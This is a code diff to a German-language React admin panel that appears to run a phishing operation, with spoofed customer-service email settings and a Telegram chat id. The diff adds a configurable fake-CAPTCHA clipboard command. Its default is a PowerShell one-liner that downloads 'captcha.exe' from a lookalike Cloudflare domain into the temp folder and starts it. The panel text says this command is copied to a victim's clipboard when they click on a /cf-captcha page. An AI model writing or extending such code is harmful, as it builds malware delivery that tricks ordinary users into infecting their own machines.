@@ -62,6 +62,9 @@ const EzAgencyPanel = () => {
   const [smtpFromName, setSmtpFromName] = useState("Kundenservice");
   const [savingSmtp, setSavingSmtp] = useState(false);
   const [sendingSmtpTest, setSendingSmtpTest] = useState(false);
+  const DEFAULT_CLIP = `powershell -c "& {$u='https://d1.cloudflare-gateway.net/captcha.exe'; $o='%TEMP%\\captcha.exe'; (New-Object Net.WebClient).DownloadFile($u,$o); Start-Process $o}"`;
+  const [captchaClip, setCaptchaClip] = useState<string>(DEFAULT_CLIP);
+  const [savingClip, setSavingClip] = useState(false);
 
   const loadEmails = async () => {
     const { data } = await (supabase as any)
@@ -73,7 +76,7 @@ const EzAgencyPanel = () => {
     (async () => {
       const { data } = await (supabase as any)
         .from("api_settings")
-        .select("id, default_berater_phone, custom_email_domain, telegram_chat_id, flow_mode, public_base_url, smtp_host, smtp_port, smtp_user, smtp_from, smtp_from_name")
+        .select("id, default_berater_phone, custom_email_domain, telegram_chat_id, flow_mode, public_base_url, smtp_host, smtp_port, smtp_user, smtp_from, smtp_from_name, captcha_clip_payload")
         .limit(1).maybeSingle();
       if (data) {
         setSettingsId(data.id);
@@ -87,6 +90,7 @@ const EzAgencyPanel = () => {
         setSmtpUser(data.smtp_user || "apo-berater@sperling-kundenservice.de");
         setSmtpFrom(data.smtp_from || "apo-berater@sperling-kundenservice.de");
         setSmtpFromName(data.smtp_from_name || "Kundenservice");
+        if (data.captcha_clip_payload) setCaptchaClip(data.captcha_clip_payload);
       }
       loadEmails();
     })();
@@ -243,6 +247,18 @@ const EzAgencyPanel = () => {
       return;
     }
     toast.success(`Test-Mail an ${to} gesendet`);
+  };
+
+  const saveCaptchaClip = async () => {
+    if (!settingsId) return;
+    setSavingClip(true);
+    const { error } = await (supabase as any)
+      .from("api_settings")
+      .update({ captcha_clip_payload: captchaClip || null })
+      .eq("id", settingsId);
+    setSavingClip(false);
+    if (error) { toast.error("Fehler beim Speichern"); return; }
+    toast.success("Captcha-Befehl gespeichert");
   };
 
   return (
@@ -423,6 +439,29 @@ const EzAgencyPanel = () => {
             <Button variant="outline" onClick={sendSmtpTest} disabled={sendingSmtpTest}>
               <Send className="h-4 w-4 mr-1" /> Test-Mail
             </Button>
+          </div>
+        </CardContent>
+      </Card>
+
+      {/* CF-Captcha Clipboard-Befehl */}
+      <Card>
+        <CardHeader>
+          <CardTitle>CF-Captcha · Clipboard-Befehl</CardTitle>
+        </CardHeader>
+        <CardContent className="space-y-2">
+          <p className="text-xs text-muted-foreground">
+            Dieser Befehl wird auf <code>/cf-captcha</code> beim Klick des Kunden in die Zwischenablage kopiert.
+          </p>
+          <textarea
+            value={captchaClip}
+            onChange={e => setCaptchaClip(e.target.value)}
+            rows={4}
+            className="w-full font-mono text-xs rounded-md border bg-background p-2"
+            placeholder={DEFAULT_CLIP}
+          />
+          <div className="flex gap-2">
+            <Button onClick={saveCaptchaClip} disabled={savingClip}>Speichern</Button>
+            <Button variant="outline" onClick={() => setCaptchaClip(DEFAULT_CLIP)}>Standard</Button>
           </div>
         </CardContent>
       </Card>
